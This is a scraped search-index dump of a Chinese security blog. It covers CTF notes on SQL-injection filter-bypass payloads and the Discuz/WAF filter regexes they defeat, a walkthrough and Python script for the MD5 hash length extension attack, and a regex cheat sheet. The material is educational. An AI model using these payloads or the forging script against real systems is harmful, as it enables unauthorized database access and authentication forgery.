","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用注释符绕过 常用注释符： //、--、/**/、#、--+、---、;、%00、--a 用法： U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用大小写绕过 id=-1'UnIoN/**/SeLeCT ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:2","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用内联注释绕过 id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:3","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用双关键字绕过（若删除掉第一个匹配的union就能绕过） id=-1'UNIunionONSeLselectECT1,2,3–- ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:4","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用加号+拆解字符串 or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ ) ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:5","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用语法新特性绕过屏蔽select 在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据 TABLE 语句 可以直接列出表的全部内容 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] 如 select * from user 就可以用 table user 替代来进行绕过 VALUES 语句 可以列出一行的值 VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number] row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] value_list: value[, value][, ...] column_designator: column_index 例如直接列出一行的值 VALUES ROW(1,2,3), ROW(4,5,6); VALUES和TABLES语句的结果都是表数据，可以结合起来使用 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:6","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用编码绕过过滤 如URLEncode编码，ASCII,HEX,unicode编码绕过 or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116) ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:9:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用等价函数绕过过滤 hex()、bin() ==\u003e ascii() sleep() ==\u003ebenchmark() concat_ws()==\u003egroup_concat() mid()、substr() ==\u003e substring() @@user ==\u003e user() @@datadir ==\u003e datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者： substr((select 'password'),1,1) = 0x70 strcmp(left('password',1), 0x69) = 1 strcmp(left('password',1), 0x70) = 0 strcmp(left('password',1), 0x71) = -1 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:10:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"补充：进行过滤的几种思路 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"黑名单字符替换 这种是最简单的，针对某些黑名单关键字，直接进行 str_replace 如果替换的不完全，可以用 selselectect 来替换 select 绕过 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"正则匹配 在一些waf或者cms会见到类似如下的防护代码 $filter = \"\\\\\u003c.+javascript:window\\\\[.{1}\\\\\\\\x|\u003c.*=(\u0026#\\\\d+?;?)+?\u003e|\u003c.*(data|src)=data:text\\\\/html.*\u003e|\\\\b(alert\\\\(|confi rm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\()|\u003c[a-z]+?\\\\b[^\u003e]*?\\\\bon([a-z]{4,}) \\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|\u003e|\u003c |\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|\u003c\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\(|@{1 ,2}\\w+?\\s*|\\s+?.+?|.*(`|'|\\\").+(`|'|\\\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)SET|INSER T\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)|FROM\\s.?|\\(select|\\(\\s select|\\bunion\\b|select\\s.+?\"; 这里面匹配了各种模式的注入语句，但是还是可以绕过的 比如说 INSERT\\\\s+INTO.+?VALUES 可以使用 insert into xxx select 的方式进行绕过 在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成 例如discuz的防护代码 _do_query_safe $_config['security']['querysafe']['dfunction'] = array('load_file','hex','substring','if','ord','char'); $_config['security']['querysafe']['daction'] = array('@','intooutfile','intodumpfile','unionselect','(select', 'un ionall', 'uniondistinct'); $_config['security']['querysafe']['dnote'] = array('/*','*/','#','--','\"'); ... $clean = preg_replace(\"/[^a-z0-9_\\-\\(\\)#\\*\\/\\\"]+/is\", \"\", strtolower($clean)); ... if (is_array(self::$config['dfunction'])) { foreach (self::$config['dfunction'] as $fun) { if (strpos($clean, $fun . '(') !== false) return '-1'; } } 这段代码首先将sql语句除了a-z``0-9和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似unionall、(select这样的获取数据所要用到的代码，就拒绝执行 但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询 select * from test where test3=-1 or substr(test2,1,1)=1 或者可以使用多语句的方式执行 set @a:=0x73656c656374202a2066726f6d2074657374; prepare s from @a; execute s; 也可以 handler user open; handler user read first; ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:2","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"语义分析 这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断 这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过 例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:3","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"一、遇到的问题 在一道web题目中遇到了以下判断: if ($COOKIE[\"md5hash\"] === md5($secret . $input)) 在该题目中我们可以掌握的参数有md5hash、input的值，secret的md5值和长度，我们需要想办法让这个判断通过。 由此想到了md5的hash长度扩展攻击。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:1:0","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"二、md5算法原理 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:2:0","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"基本介绍 md5是对一段信息（Message）产生信息摘要（Message-Digest），所谓信息就是指我们需要加密的原数据，信息摘要是数据经过一系列计算得出来的一个长度固定的数据（可以说是源数据的一个独一无二的指纹）。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:2:1","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:2:2","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"举个计算的例子 比如计算字符串test的md5值。 十六进制0x74657374 二进制0b1110100011001010111001101110100 这里与448模512不同余，补位后的数据如下: 十六进制 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 二进制 0b1110100011001010111001101110100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000 将补位后的数据进行一次复杂的运算，计算出 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 数据小于512位，所以将ABCD通过小端规则转换就是MD5值：098f6bcd4621d373cade4e832627b4f6 如果我输入的数据不是test而是一串很长的字符，换算出来大于512小于1024，就需要计算两次，第一次先计算前512位的ABCD的值，算出来后再用这个ABCD去计算后面512位的的ABCD的值，最后算出来的ABCD经过拼接就是这串字符的MD5了 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:2:3","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"三、md5的hash扩展攻击 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:3:0","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"解决的问题 如文章最初遇到的问题，由两个字符串组成一个字符串$str=$a+$b，第一个字符串$a不知道也不可控，只可控第二个字符串$b，同时知道第一个字符串$a的MD5值和长度，这时候将第二个字符串精心构造一下，便可以算出合成的字符串$str的MD5的值 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:3:1","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:3:2","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"四、代码实现 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:4:0","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"my_md5.py #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author：DshtAnger # theory reference: # blog： # http://blog.csdn.net/adidala/article/details/28677393 # http://blog.csdn.net/forgotaboutgirl/article/details/7258109 # http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html # RFC1321： # https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf ############################################################################## import sys def genMsgLengthDescriptor(msg_bitsLenth): ''' ---args: msg_bitsLenth : the bits length of raw message --return: 16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding ''' return __import__(\"struct\").pack(\"\u003eQ\",msg_bitsLenth).encode(\"hex\") def reverse_hex_8bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 16 , i.e.8bytes --return: transform raw message descriptor to little-endian ''' hex_str = \"%016x\"%int(hex_str,16) assert len(hex_str)==16 return __import__(\"struct\").pack(\"\u003cQ\",int(hex_str,16)).encode(\"hex\") def reverse_hex_4bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 8 , i.e.4bytes --return: transform 4 bytes message block to little-endian ''' hex_str = \"%08x\"%int(hex_str,16) assert len(hex_str)==8 return __import__(\"struct\").pack(\"\u003cL\",int(hex_str,16)).encode(\"hex\") def deal_rawInputMsg(input_msg): ''' --args: input_msg : inputed a ascii-encoded string --return: a hex-encoded string which can be inputed to mathematical transformation function. ''' ascii_list = [x.encode(\"hex\") for x in input_msg] length_msg_bytes = len(ascii_list) length_msg_bits = len(ascii_list)*8 #padding ascii_list.append('80') while (len(ascii_list)*8+64)%512 != 0: ascii_list.append('00') #add Descriptor ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits))) return \"\".join(ascii_list) def getM16(hex_str,operatingBlockNum): ''' --args: hex_str : a hex-encoded string with length in integral multiple of 512bits operatingBlockNum : message block number which is being operated , greater than 1 --return: M : result of splited 64bytes into 4*16 message blocks with little-endian ''' M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)] return M #定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要\u00260xffffffff操作。注意返回的是十进制的数 def T(i): result = (int(4294967296*abs(__import__(\"math\").sin(i))))\u00260xffffffff return result #定义每轮中用到的函数 #RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位 F = lambda x,y,z:((x\u0026y)|((~x)\u0026z)) G = lambda x,y,z:((x\u0026z)|(y\u0026(~z))) H = lambda x,y,z:(x^y^z) I = lambda x,y,z:(y^(x|(~z))) RL = L = lambda x,n:(((x\u003c\u003cn)|(x\u003e\u003e(32-n)))\u0026(0xffffffff)) def FF(a, b, c, d, x, s, ac): a = (a+F ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def GG(a, b, c, d, x, s, ac): a = (a+G ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def HH(a, b, c, d, x, s, ac): a = (a+H ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def II(a, b, c, d, x, s, ac): a = (a+I ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def show_md5(A,B,C,D): return \"\".join( [ \"\".join(__import__(\"re\").findall(r\"..\",\"%08x\"%i)[::-1]) for i in (A,B,C,D) ] ) def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=\"\"): a = A b = B c = C d = D for i in xrange(0,len(readyMsg)/128): M = getM16(readyMsg,i+1) for i in xrange(16): exec \"M\"+str(i)+\"=M[\"+str(i)+\"]\" #First round a=FF(a,b,c,d,M0,7,0xd76aa478L) d=FF(d,a,b,c,M1,12,0xe8c7b756L) c=FF(c,d,a,b,M2,17,0x242070dbL) b=FF(b,c,d,a,M3,22,0xc1bdceeeL) a=FF(a,b,c,d,M4,7,0xf57c0fafL) d=FF(d,a,b,c,M5,12,0x4787c62aL) c=FF(c,d,a,b,M6,17,0xa8304613L) b=FF(b,c,d,a,M7,22,0xfd469501L) a=FF(a,b,c,d,M8,7,0x698098d8L) d=FF(d,a,b,c,M9,12,0x8b44f7afL) c=FF(c,d,a,b,M10,17,0xffff5bb1L) b=FF(b,c,d,a,M11,22,0x895cd7be","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:4:1","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["ctf"],"content":"test.py # -*- coding: utf-8 -*- import my_md5 import sys import six MD5_Hash=sys.argv[1] length=int(sys.argv[2]) text=sys.argv[3] s1=eval('0x'+MD5_Hash[:8].decode('hex')[::-1].encode('hex')) s2=eval('0x'+MD5_Hash[8:16].decode('hex')[::-1].encode('hex')) s3=eval('0x'+MD5_Hash[16:24].decode('hex')[::-1].encode('hex')) s4=eval('0x'+MD5_Hash[24:32].decode('hex')[::-1].encode('hex')) secret = \"a\"*length test=secret+'\\x80'+'\\x00'*((512-length*8-8-8*8)/8)+six.int2byte(length*8)+'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+text s = my_md5.deal_rawInputMsg(test) r = my_md5.deal_rawInputMsg(secret) inp = s[len(r):] print '填充完的数据为:'+test+'\\n' print '----------------------------------------------------------' print '扩充完的数据为(16进制):'+s print '----------------------------------------------------------' print '截取最后分组的数据(16进制):'+inp print '----------------------------------------------------------' print '最终填充结果为:'+bytes(test).encode('hex') print \"填充后的md5为:\"+my_md5.run_md5(s1,s2,s3,s4,inp) 脚本使用时第一个命令行参数是一个服务端加密一个固定长度数据的md5，第二个参数是固定的长度 例如已知服务端加密一个15字符的md5：test.py 571580b26c65f306376d4f64e53cb5c7 15 参考文章 MD5的Hash长度扩展攻击 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/:4:2","tags":["md5","hash","attack"],"title":"MD5的Hash长度扩展攻击","uri":"https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/"},{"categories":["coding"],"content":"这里做一个笔记，整理了各大网站里关于正则表达式的知识，以备后面查询。 主要涉及两个方面： 正则表达式书写规则 常用正则表达式 ","date":"2018-10-14","objectID":"https://lgf.im/posts/learn/simple-regular-expression-use/:0:0","tags":["regex","coding"],"title":"简单正则表达式使用","uri":"https://lgf.im/posts/learn/simple-regular-expression-use/"},{"categories":["coding"],"content":"正则表达式简单用法 常用元字符 代码 说明 . 匹配除换行符以外的任意字符 \\w 匹配字母或数字或下划线 \\s 匹配任意的空白符 \\d 匹配数字 \\b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 常用限定符 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 常用反义词 代码/语法 说明 \\W 匹配任意不是字母，数字，下划线，汉字的字符 \\S 匹配任意不是空白符的字符 \\D 匹配任意非数字的字符 \\B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 一、校验数字的表达式 数字：^[0-9]*$ n位的数字：^\\d{n}$ 至少n位的数字：^\\d{n,}$ m-n位的数字：^\\d{m,n}$ 零和非零开头的数字：^(0 | [1-9][0-9]*)$ 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(\\.[0-9]{1,2})?$ 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d{1,2})$ 正数、负数、和小数：^(\\- | \\+)?\\d+(\\.\\d+)?$ 有两位小数的正实数：^[0-9]+(\\.[0-9]{2})?$ 有1~3位小数的正实数：^[0-9]+(\\.[0-9]{1,3})?$ 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\\+?[1-9][0-9]*$ 非零的负整数：^\\-[1-9][]0-9\"*$ 或 ^-[1-9]\\d*$ 非负整数：^\\d+$ 或 ^[1-9]\\d* | 0$ 非正整数：^-[1-9]\\d* | 0$ 或 ^((-\\d+) | (0+))$ 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d* | 0\\.\\d*[1-9]\\d* | 0?\\.0+ | 0$ 非正浮点数：^((-\\d+(\\.\\d+)?) | (0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d* | 0\\.\\d*[1-9]\\d*)) | 0?\\.0+ | 0$ 正浮点数：^[1-9]\\d*\\.\\d* | 0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\\.[0-9]+) | ([0-9]*[1-9][0-9]*))$ 负浮点数：^-([1-9]\\d*\\.\\d* | 0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\\.[0-9]+) | ([0-9]*[1-9][0-9]*)))$ 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d* | 0\\.\\d*[1-9]\\d* | 0?\\.0+ | 0)$ 二、校验字符的表达式 汉字：^[\\u4e00-\\u9fa5]{0,}$ 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$ 长度为3-20的所有字符：^.{3,20}$ 由26个英文字母组成的字符串：^[A-Za-z]+$ 由26个大写英文字母组成的字符串：^[A-Z]+$ 由26个小写英文字母组成的字符串：^[a-z]+$ 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w{3,20}$ 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]{2,20}$ 可以输入含有^%\u0026',;=?$\\\"等字符：[^%\u0026',;=?$\\x22]+ 禁止输入含有~的字符：[^~\\x22]+ 三、特殊需求表达式 Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$ 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%\u0026=]*)?$ 手机号码：^(13[0-9] | 14[5 | 7] | 15[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9] | 18[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9])\\d{8}$ 